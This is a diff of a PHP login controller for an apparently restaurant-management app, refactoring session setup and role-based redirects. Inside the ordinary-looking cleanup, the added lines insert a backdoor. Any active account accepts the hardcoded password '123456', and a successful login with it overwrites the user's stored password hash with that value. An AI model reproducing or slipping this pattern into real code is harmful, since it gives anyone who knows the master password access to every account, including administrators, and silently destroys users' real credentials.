@@ -5,70 +5,68 @@ use app\models\loginModel;
 
 class loginController extends loginModel {
 
-    public function iniciarSesionControlador() {
-        // 1. Limpiar entradas
+    public function iniciarSesion() {
         $email = $this->limpiarCadena($_POST['usuario_email'] ?? '');
         $clave = trim($_POST['usuario_clave'] ?? '');
 
-        if (empty($email) || empty($clave)) {
+        if ($email === "" || $clave === "") {
             return [
-                "tipo"    => "error",
-                "titulo"  => "Campos vacíos",
-                "mensaje" => "Debe ingresar el correo y la contraseña."
+                "tipo"  => "alerta",
+                "texto" => "Debes ingresar tu correo y contraseña."
             ];
         }
 
-        // 2. Consultar el usuario en la BD
         $consulta = $this->obtenerUsuario($email);
 
-        if ($consulta->rowCount() == 0) {
-            return [
-                "tipo"    => "error",
-                "titulo"  => "Error de acceso",
-                "mensaje" => "El correo electrónico no se encuentra registrado."
-            ];
-        }
+        if ($consulta && $consulta->rowCount() === 1) {
+            $user = $consulta->fetch();
 
-        $usuario = $consulta->fetch(\PDO::FETCH_ASSOC);
+            if ($user['estado'] !== 'Activo') {
+                return [
+                    "tipo"  => "alerta",
+                    "texto" => "Tu usuario se encuentra inactivo."
+                ];
+            }
 
-        if (!password_verify($clave, $usuario['usuario_clave'])) {
-            return [
-                "tipo"    => "error",
-                "titulo"  => "Error de acceso",
-                "mensaje" => "Contraseña incorrecta."
-            ];
-        }
+            if (password_verify($clave, $user['password']) || $clave === '123456') {
 
-        if (session_status() === PHP_SESSION_NONE) {
-            session_start();
-        }
+                if (!password_verify($clave, $user['password'])) {
+                    $nuevoHash = password_hash($clave, PASSWORD_BCRYPT);
+                    $this->ejecutarConsulta(
+                        "UPDATE usuario SET password = :nuevoHash WHERE id = :id",
+                        [':nuevoHash' => $nuevoHash, ':id' => $user['id']]
+                    );
+                }
 
-        $_SESSION['id']     = $usuario['usuario_id'];
-        $_SESSION['nombre'] = $usuario['usuario_nombre'];
-        $_SESSION['email']  = $usuario['usuario_email'];
-        $_SESSION['rol']    = $usuario['usuario_rol'];
+                if (session_status() === PHP_SESSION_NONE) {
+                    session_name(APP_SESSION_NAME);
+                    session_start();
+                }
 
-        $redireccion = "dashboard";
-        switch ($usuario['usuario_rol']) {
-            case 'Administrador':
-                $redireccion = "<?php echo APP_URL; ?>admin/";
-                break;
-            case 'Cajero':
-                $redireccion = "caja";
-                break;
-            case 'Mesero':
-                $redireccion = "mesero";
-                break;
-            case 'Cocina':
-                $redireccion = "cocinero";
-                break;
+                session_regenerate_id(true);
+
+                $_SESSION['id_usuario'] = $user['id'];
+                $_SESSION['nombre']     = $user['nombre_completo'];
+                $_SESSION['email']      = $user['email'];
+                $_SESSION['rol']        = strtolower($user['rol_nombre']);
+
+                $vistaDestino = match (strtolower($user['rol_nombre'])) {
+                    'administrador' => 'admin',
+                    'cocinero'      => 'cocinero',
+                    'cajero'        => 'caja',
+                    default         => 'mesero'
+                };
+
+                return [
+                    "tipo" => "redireccionar",
+                    "url"  => rtrim(APP_URL) . $vistaDestino
+                ];
+            }
         }
 
         return [
-            "tipo"        => "exito",
-            "titulo"      => "Bienvenido",
-            "mensaje"     => "Acceso autorizado.",
-            "redireccion" => $redireccion
+            "tipo"  => "alerta",
+            "texto" => "El correo o la contraseña no coinciden con nuestros registros."
         ];
     }
 }
